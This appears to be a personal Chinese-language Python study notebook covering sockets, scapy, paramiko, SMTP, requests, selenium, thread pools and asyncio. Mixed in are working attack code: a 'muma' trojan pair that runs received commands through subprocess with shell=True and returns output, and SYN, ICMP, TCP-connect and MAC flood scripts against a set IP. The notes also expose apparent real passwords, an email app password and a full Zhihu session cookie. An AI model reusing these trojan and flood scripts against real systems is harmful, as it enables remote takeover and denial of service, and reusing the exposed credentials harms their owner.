# connect()之后就向TCP服务器发送了一个连接请求。TCP服务器监听到这个请求之后，就会调用accept()函数取接收请求，
# 这样连接就建立好了。之后就可以开始网络I/O操作了，即类同于普通文件的读写I/O操作。
# int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
# accept函数的第一个参数为服务器的socket描述字，第二个参数为指向struct sockaddr *的指针，
# 用于返回客户端的协议地址，第三个参数为客户端协议地址的长度。如果accpet成功，那么其返回值是由内核自动生成的一个全新的描述字，
# 代表与返回客户的TCP连接。
#
# connect函数的第一个参数即为客户端的socket描述字，第二参数为服务器的socket地址，
# 第三个参数为socket地址的长度。客户端通过调用connect函数来建立与TCP服务器的连接。
# socket.gethostbyname( host )参数为一个域名，返回域名的IP。


def recv111(datas, event1):
    while True:
        receive = datas.recv(1024)  # 接收客户端信息，指定接收字节大小
        if not receive or (receive.decode() == 'exit'):
            break
        receive_decode = receive.decode()
        print('客户端：', receive_decode)
    print('客户端已退出')
    event1.set()


def send111(datas, event1):
    while True:
        tosend_serv = input("")
        datas.sendall(tosend_serv.encode())
        if event1.is_set():
            break

#bytes.decode(encoding="utf-8", errors="strict")
# str.encode(encoding="utf-8", errors="strict")编码后是字节码
# 其中的encoding是指在解码编码过程中使用的编码格式，errors是指错误的处理方案。


event1 = Event()
thread2 = threading.Thread(target=send111, args=(datas, event1))
thread1 = threading.Thread(target=recv111, args=(datas, event1,))
thread1.start()
thread2.start()
thread1.join()
thread2.join()
datas.close()
listens.close()

客户端：

from socket import *
import threading
from multiprocessing import *
ip='127.0.0.1'
port=3333
try:
    clients=socket(AF_INET,SOCK_STREAM)
    clients.connect((ip,port))
except:
    print('服务端连接失败')
else:
    print('服务端连接成功')

def send222(clients,event1):
    while True:
        tosend=input("")
        clients.sendall(tosend.encode())
        if event1.is_set()or (tosend=='exit'):
            break

       
def recv222(clients,event1):
    while True:
        receive=clients.recv(1024)
        if not receive:
            break
        print("服务器：",receive.decode())
    print("服务器关闭")
    event1.set()

event1=Event()
thread1=threading.Thread(target=send222,args=(clients,event1,))
thread2=threading.Thread(target=recv222,args=(clients,event1,))
thread1.start()
thread2.start()
thread1.join()
thread2.join()
clients.close()

Linux下：
内容一样。
python client1.py	就行


socket编程Windows下传输文件(视频，文件，图片)（其他类型更改一下即可）:
传输函数：
elif tosend_serv == '传输文件':
            send_file(datas)
def send_file(datas):
    path_file = os.path.abspath(__file__)
    path_dir = os.path.dirname(path_file)
    path = os.path.join(path_dir, '第一个传输文件', 'C铭.mp4')
    file_size = os.stat(path).st_size
    line1 = os.path.basename(path)+'|'+str(file_size)
    datas.send(line1.encode(encoding='utf-8'))
    sum = 0
    with open(path, 'rb')as f:
        print('进入文件传输循环')
        while sum != file_size:
            data = f.read(1024)
            datas.sendall(data)
            sum += len(data)
    print('文件传输完成！')
    datas.send('传输完成'.encode())
接收函数：
elif receive.decode()=='传输文件':
            receive_file(clients)
def receive_file(clients):
    path_file = os.path.abspath(__file__)
    path_dir = os.path.dirname(path_file)
    file_name, file_size = clients.recv(1024).decode(encoding='utf-8').split('|')
    file_size = int(file_size)
    path = os.path.join(path_dir, '接收文件', file_name)
    sum = 0
    with open(path, 'wb')as f:
        print('进入文件接收循环')
        while sum < file_size :
            data = clients.recv(1024)
            f.write(data)
            sum += len(data)
    print('文件接收完成')

socket编程之远程执行：
法一：os模块：
（1）：
# 利用os模块进行系统调用,py3中popen参数为str,所以先decode
        data = os.popen(receive.decode()).read()
        # 发送命令执行结果
        socket1.send(data.encode('utf-8'))
（2）：
	#参数也为str。
	data = os.system(receive.decode())
	#data=0表示执行成功
法二：subprocess模块：
（1）：popen函数
控制方：
def muma_recv(clients):
    while 1:
        receive = clients.recv(1024)
        if receive.decode('gbk') == '木马执行退出':
            break
 # Windows终端默认编码是gbk,所以得用gbk进行解码
        print(receive.decode('gbk'))
被控方：
def muma(datas):
    datas.send('木马开始执行'.encode())
    while 1:
        data1=datas.recv(1024).decode()
        data = subprocess.Popen(data1,shell=True,
                                stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE
                              )
        stdout = data.stdout.read()#直接打印read()出的内容也可以
        stderr = data.stderr.read()
#以上两句可以替换成stdout,stderr = data.communicate()
#该方法中的可选参数 input 应该是将被发送给子进程的数据，或者如没有数据发送给子进程，该参数应该是None。input参数的数据类型必须是字节串，如果#universal_newlines参数值为True，则input参数的数据类型必须是字符串。如：out,err = data.communicate(input='print(1) \n')相当于data.stdin.write('print(1) \n')	实测结果是，传入的数据没有任何反应，以后用到再深究吧。
#该方法返回一个元组(stdout_data, stderr_data)，这些数据将会是字节穿或字符串（如果universal_newlines的值为True）。
#如果在timeout指定的秒数后该进程还没有结束，将会抛出一个TimeoutExpired异常。捕获这个异常，然后重新尝试通信不会丢失任何输出的数据。但是超时之#后子进程并没有被杀死，为了合理的清除相应的内容，一个好的应用应该手动杀死这个子进程来结束通信。
#需要注意的是，这里读取的数据是缓冲在内存中的，所以，如果数据大小非常大或者是无限的，就不应该使用这个方法

        
        res = stdout + stderr

        res = stdout + stderr
        if data1 == 'exit':
            break
        datas.send(res)
    datas.send('木马执行退出'.encode('gbk'))
（2）：run函数：
控制方：
def muma_recv(clients):
    while 1:
        receive = clients.recv(1024)
        if receive.decode() == '木马执行退出':
            break
        print(receive.decode())
被控方：
def muma(datas):
    datas.send('木马开始执行'.encode())
    while 1:
        data1=datas.recv(1024).decode()
        data = subprocess.run(data1,shell=True,
                                stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                universal_newlines=True	#使用字符串输出时，默认是utf-8，字节流默认是gbk。它的值默认为False，此时stdout和stderr的输出是字节序列；当该参数的值设置为True时，stdout和stderr的输出是字符串。
                              )
        stdout,stderr = data.stdout,data.stderr	#无论上面 universal_newlines定义，都是这样赋值。
        res = stdout + stderr
        if data1 == 'exit':
            break
        datas.send(res.encode())
    datas.send('木马执行退出'.encode())

可以替代run()函数的还有subprocess.getoutput(cmd)，和subprocess.getstatusoutput(cmd)等等。


73：
python之scapy:
“_”，在Scapy中这个符号表示是上一条语句执行的结果。
lsc() 命令列出scapy的所有命令 
conf 命令列出scapy 的配置参数
构建指定协议包，例：ip=IP();icmp1=ICMP();tcp1=TCP();
#修改数据包的值	dpkg.ttl = 24
构建范围IP的包：ip=IP('192.168.233.0/24')	[p for p in ip]     查看内容。
构建协议包：Ether()/IP()/TCP();
发包的包格式： 层的协议(参数)/上一层的协议(参数) /要发送的数据
IP(src='10.96.10.208',dst='10.96.10.209')/TCP(sport=12345,dport=12345)/data
Ether()需要填的是目标的物理地址，IP()是目标的IP地址，TCP是源端口和目标端口，UDP也一样，也可以只指定目标端口，dport=。
查看支持的协议，协议的参数，生成的协议包的参数：ls() , ls(IP)，ip=IP() ls(ip)，查看生成的协议包的参数另一个命令为：ip.show()。
只发包的函数：
send(pkt, inter=0, loop=0, count=1, iface=N) :工作在第三层。不可以发包含二层的包。
sendp(pkt, inter=0, loop=0, count=1, iface=N) :工作在第二层。可以发包含二层的包。
发包并接包的函数：含有二层的包不能用三层的函数发出。
sr(pkt, filter=N, iface=N):三层发包和收包,返回值是两个列表,第一个列表是收到了应答的包和对应的应答。第二个列表是未收到应答的包。所以可以使用两个列表来保存sr()的返回值。第一个列表里收到应答的包和应答包应该是分成了两个列表，分别用s(send),r(receive)来接收。
sr1(pkt, inter=0, loop=0, count=1, iface=N):三层发包但是仅仅接受第一个回复,返回一个应答的包。只需要使用一个列表就可以保存这个函数的返回值。
srp(pkt, filter=N, iface=N) :二层发包和收包
srp1(pkt, filter=N, iface=N) :二层发包但是仅仅接受第一个回复
sr1(IP(dst="192.168.202.10")/TCP(dport=80,flags="S"))，发送SYN握手包，测试目标的某个端口是否开放，采用半开扫描（SYN）的办法。
以上函数都没问题，但是发包给自己的Linux虚拟机却接收不到应答包，不知道怎么解决，Windows虚拟机正常应答。

scapy里抓包：packet=sniff(iface='eth0',count=10)		packet=sniff(iface='WLAN 2',count=10)Windows系统的网卡名称就是WLAN 2这种类型，Linux的是eth这种。
print(packet)	显示抓取到的包的类别信息。
print(packet[0])	显示包为字节码。不知道具体含义。
print(packet[0].show())==packet[0].show()==packet[0]	显示包的具体信息。链路层 [Ethernet]、网络层[IP]、传输层[TCP/UDP]、应用层[RAW]
packet1[UDP][0].show()==packet1[UDP][0]	通过协议来查看指定的包
packet1[UDP][1][Ether].dst			直接只获取指定层的数据，和操作python类对象差不多的方法。
保存包为文件：wrpcap("text1.pcap",packet)保存文件名单双引号都可以。Windows保存为：C:\Users\dell。Linux保存在/root/目录下。
读取包为变量：packet1=rdpcap('text1.pcap')、package1 = sniff(offline='test1.pcap')读取文件名用单双引号都可以。

def sniff(count=0, store=1, offline=None, prn=None,filter=None, L2socket=None, timeout=None, opened_socket=None, stop_filter=None, iface=None，*args,**kargs)
    count：抓包的数量，0表示无限制；
    store：保存抓取的数据包或者丢弃，1保存，0丢弃
    offline：从 pcap 文件读取数据包，而不进行嗅探，默认为None
    prn：为每一个数据包定义一个函数，如果返回了什么，则显示。例如：prn = lambda x: x.summary()； （  packct.summar()函数返回的是对包的统计性信息 ）嗅探的同时打印信息
    filter：过滤规则，使用wireshark里面的过滤语法
    L2socket：使用给定的 L2socket
    timeout：在给定的时间后停止嗅探，默认为 None
    opened_socket：对指定的对象使用 .recv() 进行读取；
    stop_filter：定义一个函数，决定在抓到指定数据包后停止抓包，如：stop_filter = lambda x: x.haslayer(TCP)；
    iface：指定抓包的接口 

hexdump()： 用来将报文转码为16进制的转码
import_hexcap()：用来将报文的16进制转码重新转为报文格式


模拟traceroute:
ans, unans=sr(IP(dst="139.219.196.160", ttl=(1,30), id=RandShort())/TCP(flags=0x02))
中间要ctrl+C,有的包没有响应的。可以在sr()里加上timeout=3来代替ctrl+C。
for s,r in ans:
	print s.ttl, r.src

通过广播arp包发现内网主机。
ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )
不过目前虚拟机和真机不在同一个网段上，扫描不到虚拟机，不同IP网段连接不到。

方法              用途
summary()          显示一个关于每个数据包的摘要列表
nsummary()         同上，但规定了数据包数量
conversations()    显示一个会话图表
show()             显示首选表示（通常用nsummary()）
filter()           返回一个lambda过滤后的数据包列表
hexdump()          返回所有数据包的一个hexdump
hexraw()           返回所以数据包Raw layer的hexdump
padding()          返回一个带填充的数据包的hexdump
nzpadding()        返回一个具有非零填充的数据包的hexdump
plot()             规划一个应用到数据包列表的lambda函数
make table()       根据lambda函数来显示表格
ls() 　　　　　　　 列出scapy中已实现的网络协议
ls(协议类型) 　　　 查看某个协议头部字段格式
lsc() 　　　　　　  列出scapy中可以使用的命令或函数，比如嗅探时，我们经常会用到sniff()函数
IP().show()　　　 　显示包的IP信息
IP().display()     显示包的模板

74：Python自动化库之paramiko
连接kali的root用户需要更改/etc/ssh/ssh_config文件：
将
    # Authentication:
    LoginGraceTime 120
    PermitRootLogin without passwd
    StrictModes yes
改成
    # Authentication:
    LoginGraceTime 120
    PermitRootLogin yes
    StrictModes yes
不然默认不允许登录root的账号。
net start查看开启了哪些服务。
route print查看路由表。
（1）远程登录ssh并执行命令：
import paramiko
 
#第一步需要创建一个ssh连接
ssh_client = paramiko.SSHClient()
#然后需要设置授权
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
# 上面两行代码不用动
# 然后进行正式连接，hostname就是服务器的ip,port默认22，username和password就是你的服务器用户名和密码
ssh_client.connect(hostname='192.168.233.128', port=22, username='root', password='995940822')
# 建立连接之后可以通过下面一行语句进行判断是否能够正常运行
stdin, stdout, stderr = ssh_client.exec_command('ls')
# stdout是运行命令之后返回的结果，如果运行出错的话stderr会存储错误信息，正常情况下stdout，stderr只会有一个变量有内容（要么正常运行，结果给stdout，
# 要么报错，结果给stderr）
print(stdout.read().decode('utf-8'))
# 关闭连接
ssh_client.close()
（2）上传文件：
import paramiko
# 定义一个上传函数
def send_file(ip,username,password):
    # 指定上传之后的路径，文件放在服务器的哪个目录下
    path = '/root/Desktop/'
    # 用户名密码没啥好说的
    username = username
    password = password
    # 这里是建立一个传输连接，Transport函数里需要传入ip和端口，采用我这个默认的方式即可
    tran = paramiko.Transport((ip, 22))
    # 传输连接起来
    tran.connect(username=username, password=password)
    # 默认不用管
    sftp = paramiko.SFTPClient.from_transport(tran)
    # 本地文件的位置，可以采用绝对路径或者相对路径，这里我的targetFile和我的代码在同一目录下，如果在不同目录下可以用绝对路径，
    # 例如D:\临时文件\数据运维期末作业\targetFile.py
    local_path = "666.py"
    # 远程存放地址，在path下
    remote_path = path + '/666.py'
    # 上传
    sftp.put(local_path, remote_path)
    # 关闭
    tran.close()
    print(f'服务器{ip}推送完成')

send_file('192.168.233.128','root','995940822')

75：SMTP封装邮件类
https://blog.csdn.net/chinesepython/article/details/82465947?app_version=5.9.0&code=app_1562916241&csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%2282465947%22%2C%22source%22%3A%22m0_69869001%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app

import smtplib
from email.header import Header
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


def send_email_by_qq(to):
    sender_mail = '1029309867@qq.com'
    sender_pass = 'ibkdouxknfxzbcbb'  # 同样是乱打的

    # 设置总的邮件体对象，对象类型为mixed
    msg_root = MIMEMultipart('mixed')
    # 邮件添加的头尾信息等
    msg_root['From'] = '1029309867@qq.com<1029309867@qq.com>'
    msg_root['To'] = to
    # 邮件的主题，显示在接收邮件的预览页面
    subject = '何东泽使用代码发送的第一封邮件，建议打开看看'
    msg_root['subject'] = Header(subject, 'utf-8')

    # 构造文本内容
    text_info = 'hello world'
    text_sub = MIMEText(text_info, 'plain', 'utf-8')
    msg_root.attach(text_sub)

    # 构造超文本
    url = "https://blog.csdn.net/chinesepython"
    html_info = """
    <p>点击以下链接，你会去向一个更大的世界</p>
    <p><a href="%s">click me</a></p>
    <p>i am very galsses for you</p>
    """ % url
    html_sub = MIMEText(html_info, 'html', 'utf-8')
    # 如果不加下边这行代码的话，上边的文本是不会正常显示的，会把超文本的内容当做文本显示
    html_sub["Content-Disposition"] = 'attachment; filename="csdn.html"'
    # 把构造的内容写到邮件体中
    msg_root.attach(html_sub)

    # 构造图片
    image_file = open(
        r'E:\元气壁纸缓存\飞火\FFWallPaper\custom\samuraidoge\5a989f158267926702c5edfc34bda534_1_2_400x225.webp', 'rb').read()
    image = MIMEImage(image_file)
    image.add_header('Content-ID', '<image1>')
    # 如果不加下边这行代码的话，会在收件方方面显示乱码的bin文件，下载之后也不能正常打开
    image["Content-Disposition"] = 'attachment; filename="dog_want.png"'
    msg_root.attach(image)

    # 构造附件
    txt_file = open(r'F:\Java第一次实验课\Hello.java', 'rb').read()
    txt = MIMEText(txt_file, 'base64', 'utf-8')
    txt["Content-Type"] = 'application/octet-stream'
    # 以下代码可以重命名附件为hello_world.txt
    txt.add_header('Content-Disposition', 'attachment',
                   filename='Hello.java')
    msg_root.attach(txt)

    try:
        sftp_obj = smtplib.SMTP('smtp.qq.com', 25)
        sftp_obj.login(sender_mail, sender_pass)
        sftp_obj.sendmail(sender_mail, to, msg_root.as_string())
        sftp_obj.quit()
        print('sendemail successful!')

    except Exception as e:
        print('sendemail failed next is the reason')
        print(e)


if __name__ == '__main__':
    # 可以是一个列表，支持多个邮件地址同时发送，测试改成自己的邮箱地址
    to = '1029309867@qq.com'
    send_email_by_qq(to)

76：Requests库：
响应对象的类型是requests.models.Response，响应体内容的类型是str，Cookies 的类型是RequestCookieJar。
r = requests.get('https://www.baidu.com')
r = requests.post('https://www.baidu.com')
r = requests.put('https://www.baidu.com')
r = requests.delete('https://www.baidu.com')
r = requests.head('https://www.baidu.com')
r = requests.options('https://www.baidu.com')
可以访问http://httpbin.org/get这个url来查看请求体内的构造。相对应的方法修改就行。get/post.
import requests
r = requests.post('http://httpbin.org/post')
print(r.text)
get方法传参除了直接在url中打上数据，还可以：
import requests
data = {
	'name':'germey',
  'age':22
}
r = requests.get('http://httpbin.org/get',params=data)
print(r.text)

设置请求头方法(GET/POST)：
import requests
headers = {
  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'my-test':'Hello'
}
r = requests.get('http://httpbin.org/get',headers=headers)
print(r.text)

响应内容获取：
import requests
r = requests.get('https://www.baidu.com/')
#响应内容（str类型）
print(type(r.text),r.text)
#响应内容（bytes类型）
print(type(r.content),r.content)
#状态码
print(type(r.status_code),r.status_code)
#响应头
print(type(r.headers),r.headers)
#Cookies
print(type(r.cookies),r.cookies)
#URL
print(type(r.url),r.url)
#请求历史
print(type(r.history),r.history)

爬取指定数据：
import requests
#向资源URL发送一个GET请求
r = requests.get('https://www.baidu.com/favicon.ico')
with open('favicon.ico','wb') as f:
  f.write(r.content)

文件上传：
import requests
#以二进制方式读取当前目录下的favicon.ico文件，并将其赋给file
files = {'file':open('favicon.ico','rb')}
#进行上传
r = requests.post('http://httpbin.org/post',files=files)
print(r.text)

获取cookie：
import requests
r = requests.get('https://www.baidu.com')
#打印Cookies对象
print(r.cookies)
#遍历Cookies
for key,value in r.cookies.items():
	print(key+'='+value)

携带cookie发送：
在header头中设置cookie键值对即可。
import requests
headers = {
  'Cookie':'_zap=616ef976-1fdb-4b8c-a3cb-9327ff629ff1; _xsrf=0CCNkbCLtTAlz5BfwhMHBHJWW791ZkK6; d_c0=\"AKBQTnFIRhSPTpoYIf6mUxSic2UjzSp4BYM=|1641093994\"; __snaker__id=mMv5F3gmBHIC9jJg; gdxidpyhxdE=E%2BNK7sMAt0%2F3aZ5Ke%2FSRfBRK7B1QBmCtaOwrqJm%2F1ONP3VPItkrXCcMiAX3%2FIsSxUwudQPyuDGO%2BlHGPvNqGqO9bX1%2B58o7wmf%2FZewh8xSPg%2FH3T2HoWsrs7ZhsSGND0C0la%2BXkLIIG5XXV85PxV5g99d%5CMph%2BbkX1JQBGhDnL3N0zRf%3A1641094897088; _9755xjdesxxd_=32; YD00517437729195%3AWM_NI=rMeMx2d5Yt3mg0yHPvuPGTjPnGtjL%2Bn%2FPSBnVn%2FHFAVZnIEABUIPITBdsHmMX1iCHfKauO4qhW%2Bi5bTy12Cg91vrxMPgOHtnaAylN8zk7MFpoTr%2FTeKVo3%2FKSSM6T5cNSGE%3D; YD00517437729195%3AWM_NIKE=9ca17ae2e6ffcda170e2e6ee8bea40f8e7a4b2cf69b3b48fb7c54b979b8fbaf17e93909b91fb338ebaaeadec2af0fea7c3b92ab293abaefb3aa8eb9795b267a5f0b7a9d37eb79089b5e95cae99bc8bcf21aef1a0b4c16696b2e1a9c54b9686a2aac84b828b87b1cc6082bcbda9f0479cefa7a4cb6e89bfbbb0b77bac89e58ab86a98a7ffd3c26dfbefba93fb4794b981a9f766a39fb78dcd34bab5f9aec57cad8cbed0d76f898aa1d4ae41918d83d7d73fa1929da8c837e2a3; YD00517437729195%3AWM_TID=Kji43bLtZbRAAAVABFMu4upmK4C%2BEGQH; KLBRSID=9d75f80756f65c61b0a50d80b4ca9b13|1641268679|1641267986; tst=r; NOT_UNREGISTER_WAITING=1; SESSIONID=lbWS7Y8pmp5qM1DErkXJCahgQwwyl79eT8XAOC6qC7A; JOID=V1wXAUwzD9BQH284PTQMxsZMqrkrXmuHBio3Bk1cfuMhV1x9fiHKBjYcaD44XxiWm2kKD5TjJvk-7iTeM3d6aYA=; osd=VVoQAk0xCddTHm0-OjcNxMBLqbgpWGyEBygxAU5dfOUmVF1_eCbJBzQabz05XR6RmGgICZPgJ_s46SffMXF9aoE=; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1640500881,1641093994,1641267987; Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49=1641268678',
  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'Host':'www.zhihu.com'
}
r = requests.get('https://www.zhihu.com/people/xing-fu-shi-fen-dou-chu-lai-de-65-18',headers=headers)
print(r.text)


查看python安装位置：cmd中输入python,然后import sys;print(sys.path)


77：selenium库：
pip install -i https://pypi.douban.com/simple selenium
安装浏览器驱动，需要查看自己浏览器对应版本，然后去下对应版本的驱动。下完需要放在python的scripts目录下即可。
F12中一个专门判断是否人机的参数是window.navigator.webdriver，在console输入可得。
from selenium import webdriver
from selenium.webdriver.common.by import By  # 新版本的定位方式。
from time import sleep
from chaojiying import *
# 不自动关闭浏览器
option = webdriver.EdgeOptions()
option.add_experimental_option("detach", True)
# 将option作为参数添加到Edge中
driver = webdriver.Edge(options=option)  # 应该是这里才打开浏览器引擎
#wait = ui.WebDriverWait(driver, 10)
driver.get('https://www.chaojiying.com/')  # 打开浏览器页面
#wait.until(lambda driver: driver.find_element(By.ID, "passport-login-pop"))
#点击登录
text_label = driver.find_element(
    By.XPATH, "/html/body/section[1]/div/div/div[1]/article/a[2]/i").click()
elment1 = driver.find_element(
    By.XPATH, "/html/body/div[3]/div/div[3]/div[1]/form/p[1]/input").send_keys("1029309867")

elment2 = driver.find_element(
    By.XPATH, "/html/body/div[3]/div/div[3]/div[1]/form/p[2]/input").send_keys("995940822")
elment3 = driver.find_element(
    By.XPATH, "/html/body/div[3]/div/div[3]/div[1]/form/div/img").screenshot_as_png

# 通过超级鹰传递图片获取验证码，['pic_str']这个值就是。只需改动用户密码，ID 和验证码类型
chaojiying = Chaojiying_Client(
    '1029309867', '995940822', '939719')  # 用户中心>>软件ID 生成一个替换 96001
y = chaojiying.PostPic(elment3, 1902)
# 验证码框填写并点击登录，不必改
elment3 = driver.find_element(
    By.XPATH, "/html/body/div[3]/div/div[3]/div[1]/form/p[3]/input").send_keys(y['pic_str'])
elment4 = driver.find_element(
    By.XPATH, "/html/body/div[3]/div/div[3]/div[1]/form/p[4]/input").click()

sleep(4)

获取定位元素的属性值，例如href属性：
page1.get_attribute('href')
显式等待：
wait = driver.WebDriverWait(driver, 5, poll_frequency=0.5, ignored_exceptions=None)
    page2 = wait.until(lambda driver: driver.find_element(By.XPATH, "/html/body/div[1]/div[6]/div/div[2]/h1"))
隐式等待：
driver.implicitly_wait(5)指定一个超时时间，如果超出这个时间指定元素还没有被加载出来，就会抛出 NoSuchElementException 异常
无头浏览器：
option = webdriver.EdgeOptions()
option.add_argument("--headless")
# 无头浏览器需要添加user-agent来隐藏特征
option.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36')
driver = webdriver.Edge(options=option)


78：SYN/ICMP/socket三次握手泛洪/MAC地址泛洪(未使用过)。
Python实现SYN 泛洪攻击
from scapy.all import *
from scapy.layers.inet import IP, TCP
import random


def synFlood():
    for i in range(10000):
        # 构造随机的源IP
        src = '192.168.0.194'
'''
src='%i.%i.%i.%i'%(
            random.randint(1,255),
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255)
            )
'''
        # 构造随机的端口
        sport = random.randint(1024, 65535)
        IPlayer = IP(src=src, dst='192.168.233.131')
        TCPlayer = TCP(sport=sport, dport=80, flags="S")
        packet = IPlayer/TCPlayer
        send(packet)


if __name__ == '__main__':
    synFlood()

使用socket三次握手泛洪：
from socket import *
import random
import time
import os
import threading


def socket_flood():
    try:
        while True:
            s = socket(AF_INET, SOCK_STREAM)  # 实例化
            s.connect(('192.168.233.131', 3333))  # 建立和数据库的连接
    except:
        pass


if __name__ == '__main__':
    for i in range(500):
        threading.Thread(target=socket_flood).start()  # 开启多线程

ICMP泛洪：
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import threading
# ICMP泛洪

def icmp_flood():
    while True:
        payload = 'helloworld' * 50
        pkg1 = IP(dst='192.168.233.131')
        pkg2 = ICMP()
        pkg3 = payload
        pkg = pkg1/pkg2/pkg3
        send(pkg)

if __name__ == '__main__':
    for i in range(1):
        threading.Thread(target=icmp_flood).start()

MAC地址泛洪：
#mac地址泛洪
import random
import threading
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC
def mac_flood():
    while True:
        #生成随机mac
        randmac=RandMAC("*:*:*:*:*:*")
        #生成随机IP
        srandip=f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'
        drandip = f'{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}'
        #构造数据链路层的数据包
        packet=Ether(src=randmac,dst=randmac)/IP(src=srandip,dst=drandip)
        sendp(packet,iface="使用的网卡名字",loop=0)        #sendp专门用于发送二层的数据包
if __name__ == '__main__':
    for i in range(500):
        threading.Thread(target=mac_flood).start()

79：崔哥的URL扫描代码：扫描URL原理
import threading
import requests
url=input('url:')
url=url.strip('/')
adress='D:\PHP.txt'
adress=adress.replace('"','')
error_show=0
#error_show=int(input('显示细节0/1:'))
reach_time=1
#print('timeout:',reach_time)
def scan_one_dir(name):
    
    try:
        name=name.strip()
        match = url + name
        respones = requests.get(match,timeout=reach_time)
        if respones.status_code == 404 :
            pass
        else:
            print(match + "  statu:" + str(respones.status_code))
    except:
        if error_show:
          print('('+ match + ':' + 'can not reach )')

if __name__ == '__main__':
    with open(adress) as f:
        name_list=f.readlines()
    for i in name_list:
        t = threading.Thread(target=scan_one_dir, args=(i,))
        t.start()

80：python线程池与进程池：
concurrent.futures模块内置
主要有两个ThreadPoolExecutor 线程池，ProcessPoolExecutor进程池。
from concurrent.futures import *
pool = ThreadPoolExecutor(max_workers=10)	创建线程池的线程个数。
pool.submit(handler, task)		submit一次就是一个任务，多个任务依次被线程池分别执行。
pool.shutdown()		阻塞主线程，即线程池执行完毕再执行主线程。
ProcessPoolExecutor	进程改为相应的即可。
add_done_callback可以理解为是回调函数，线程执行完之后，会自动调用指定的回调函数。
并且能拿到线程执行函数的返回值。大概就三个函数是常用的。
例子：
import time
from concurrent.futures import ThreadPoolExecutor
import random
from concurrent.futures._base import Future


# max_workers表示工人数量,也就是线程池里面的线程数量
pool = ThreadPoolExecutor(max_workers=10)
# 任务列表
task_list = ["任务1", "任务2", "任务3", "任务4", ]


def handler(task_name):
    # 随机睡眠,模仿任务执行时间不确定性
    n = random.randrange(5)
    time.sleep(n)
    print(f"任务内容:{task_name}")
    return f"任务内容:{task_name}"

def done(res: Future):
    print("done拿到的返回值:", res.result())


if __name__ == '__main__':
    # 遍历任务,
    for task in task_list:
        futrue = pool.submit(handler, task)  # type:Future
        futrue.add_done_callback(done)
    pool.shutdown()
    print("main执行完毕")

81：协程
asyncio模块是python内置。协程要配合aiohttp和aiofiles模块
1：asyncio.run(asyncTask())	asyncio.run() 函数用来在非协程函数中调用协程
2：async def asyncTask():	使用 async 声明协程
3：task1 = asyncio.create_task(asyncTask1()) asyncio.create_task() 用函数将协程打包为一个 Task 排入日程准备执行，返回 asyncio.Task 对象。
tasks = asyncio.gather(asyncTask1(), asyncTask2())可以使用 asyncio.gather() 函数来并发多个协程。等同于asyncio.create_task() 
await asyncio.gather(*task_list) == await asyncio.wait(task_list)
4：await asyncTask()	使用 await 等待一个协程。三四通常连着出现。
5：await asyncio.sleep(1)	# 协程休眠
6：async关键字只能跟def,with,for 三个关键字。await只能在async函数内部使用,用在普通函数里就会报错
三个步骤：
一：定义协程并睡眠时间相应挂起await
二：协程变成task任务对象并挂起await
三：run运行
from concurrent.futures import *
import asyncio
from datetime import *
from time import *

async def task1():
    await asyncio.sleep(2)
    print(time())

async def task2():
    await asyncio.sleep(3)
    print(time())

async def task3():
    await asyncio.sleep(4)
    print(time())

async def main():
    tasks = asyncio.gather(task1(), task2(), task3())
    await tasks
if __name__ == '__main__':
    t1 = time()
    asyncio.run(main())
    t2 = time()
    print(t2-t1)
按这种规范来，最后定义一个协程main函数来统一执行。main中包含多个任务，来实现协程多任务异步，如果只是run(task1)的话，就只是单任务。
aiofiles:
pip install aiofiles
:
# 异步文件操作
# pip install aiofiles

# 基本用法
import asyncio
import aiofiles

async def wirte_demo():
    # 异步方式执行with操作,修改为 async with
    async with aiofiles.open("text.txt","w",encoding="utf-8") as fp:
        await fp.write("hello world ")
        print("数据写入成功")

async def read_demo():
    async with aiofiles.open("text.txt","r",encoding="utf-8") as fp:
        content = await fp.read()
        print(content)

async def read2_demo():
    async with aiofiles.open("text.txt","r",encoding="utf-8") as fp:
        # 读取每行
        async for line in fp:
            print(line)
if __name__ == "__main__":
    asyncio.run(wirte_demo())
    asyncio.run(read_demo())
    asyncio.run(read2_demo())

aiohttp:
pip install aiohttp
:
import aiohttp
import asyncio

async def main():
    async with aiohttp.ClientSession() as session:
        async with session.get('http://httpbin.org/get') as resp:
            print(resp.status)
            print(await resp.text())

asyncio.run(main())
其他请求：
session.post('http://httpbin.org/post', data=b'data')
session.put('http://httpbin.org/put', data=b'data')
session.delete('http://httpbin.org/delete')
session.head('http://httpbin.org/get')
session.options('http://httpbin.org/get')
session.patch('http://httpbin.org/patch', data=b'data')


82：图片验证码识别：
pip install pillow pytesseract
https://digi.bib.uni-mannheim.de/tesseract/	下载tesseract-ocr-w64-setup-v5.0.0.20190623.exe 2019-06-23 11:30 38M 
https://gitcode.net/explore	下载chi_sim.traineddata	放到tesseract-ocr的traineddata文件夹里
pytesseract.py更改文件里的tesseract_cmd = r'E:\Tesseract-OCR-v5.0.0\tesseract.exe'目的文件位置

tesserocr安装用https://github.com/simonflueckiger/tesserocr-windows_build/releases下载whl文件然后pip install 文件名.whl
